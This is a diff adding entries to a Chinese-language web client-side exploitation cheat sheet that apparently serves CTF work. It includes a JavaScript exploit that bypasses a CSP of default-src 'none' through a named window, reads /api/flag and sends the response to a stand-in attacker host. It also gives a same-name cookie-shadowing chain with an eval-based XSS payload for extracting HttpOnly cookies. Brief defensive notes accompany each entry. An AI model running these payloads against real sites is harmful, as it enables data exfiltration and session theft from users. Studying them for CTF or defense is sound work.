@@ -138,12 +138,43 @@
 
 ## §6 其他客户端原语速查
 
+### 命名窗口泄漏（绕 CSP `default-src 'none'` 的同源响应外带）
+
+**场景**: 脚本已在目标源执行（XSS/sandbox payload），需要读同源敏感端点（`/api/flag` 类）但 CSP `default-src 'none'`（或仅缺 `connect-src` 白名单）拦 `fetch`/XHR。**CSP 不治理表单导航与命名窗口**——`form-action` 指令未设置即畅通。
+
+**利用**（form target + 命名窗口取回）:
+```javascript
+// 1. GET 表单提交到敏感端点，target 指定命名辅助窗口
+const f = document.createElement('form');
+f.target = 'flagwin'; f.method = 'GET'; f.action = '/api/flag';
+document.body.appendChild(f); f.submit();          // 命名窗口渲染同源 JSON 响应
+// 2. 等待渲染后取回已存在的命名窗口读 body
+setTimeout(() => {
+  const w = open('', 'flagwin');                    // 命中已有窗口（非新建）
+  const data = w.document.body.innerText;           // 读响应
+  location = 'https://attacker/leak?d=' + encodeURIComponent(data); // 顶层导航外带
+}, 500);
+```
+
+**判据**: `open('', name)` 返回窗口且 `w.document` 可访问（Chrome 146-153 一致，探针 `$AGENT_DIR/scripts/probe-named-window-leak/` 可复验，判据见目录内 README）。失败排查: sandbox 属性/CSP `sandbox` 指令无 `allow-popups`/`allow-forms` 时整个通道被拦（先确认运行环境不是 iframe sandbox）; 窗口未渲染完就读（加大延时）。
+
+**防御视角**: 封死此通道需显式 `form-action` + 辅助窗口管控（`sandbox` 无 allow-popups），仅设 `default-src 'none'` 无效。
+
 ### connection pool + 递归 @import（无需自有服务器）
 Chrome 每域约 6（H1）/255（H2）连接上限。占满连接池 → 暂停/恢复目标页 CSS 请求 → 递归 `@import` 逐字符 leak。
 **核心价值**: 传统递归 @import 需自有服务器 stall 下一个 CSS；此法在另一个 tab 用 255 个 H2 连接占满连接池，即可控制目标域 CSS 加载时机——**`style-src 'self'`（无法外连）时仍能递归 leak**。需准备 buffer CSS（只 @import 另一个的空 CSS）缓冲初始并发请求。
 
 ### cookie tossing
 在目标域的可控子域写 cookie → 父域读取。`public suffix`（如 `*.usercontent.goog`）内无法直接 toss → 构造 HTTP 子域 `http://sbx-fake.sbx-real.host/`。
+
+**同名 Domain cookie shadowing 全链**（cookie 名无 `__Host-` 前缀 + 服务端把 cookie 值渲染进响应时）:
+1. **准备**: 敏感 cookie 为 host-only（bot 用 `url` 不带 `domain` 设置）且 HttpOnly——同站任意 sibling 子域（`*.chal.example` 下另一可控应用/另一实例）可写 `FLAG=<payload>; Domain=chal.example; Path=/admin` 与 `Path=/` 两条
+2. **Cookie 头构造**: 浏览器按"更长 Path 先发、同 Path 旧 cookie 先发"排序（RFC 6265 §5.4）→ `/admin` 请求头携带 `攻击值(Path=/admin) ; 真值(host-only) ; 攻击值(Path=/)`——同名三次
+3. **服务端解析差异定胜负**: 重复名的取值依栈而异——**Crystal（HTTP::Cookies 为 Hash）取最后一个**（攻击值胜）、**PHP `$_COOKIE` 取第一个**（先见者胜，攻击值放 Path 最长处）、Node `cookie` 包多为最后一个。写利用前必须对目标栈实际验证同名行为
+4. **sink 触发**: 服务端把该 cookie 值未经输出编码渲染进 HTML（对照同模板其他变量的 escape 调用差异）→ 攻击值成为存储型 XSS（`<svg/onload=eval(atob(location.hash.slice(1)))>` 类）
+5. **真值回收**: onload 处理器先 `document.cookie` 删除两条 tossing cookie（写过期 `Domain=chal.example`），再 `fetch('/admin')`——剩余 host-only HttpOnly 真值仍在请求头中，且被渲染进第二次响应 → 读 body 提取（**HttpOnly 只拦 JS 直接读 cookie，不拦"同源 refetch + 读渲染响应"**）
+
+**防御识别**: `__Host-` 前缀（强制 Secure/无 Domain/Path=/）使 tossing 失效; 服务端不依赖重复 cookie 顺序; cookie 值输出编码。
 
 ### 解析器差异 checklist
 | 差异 | 利用 |
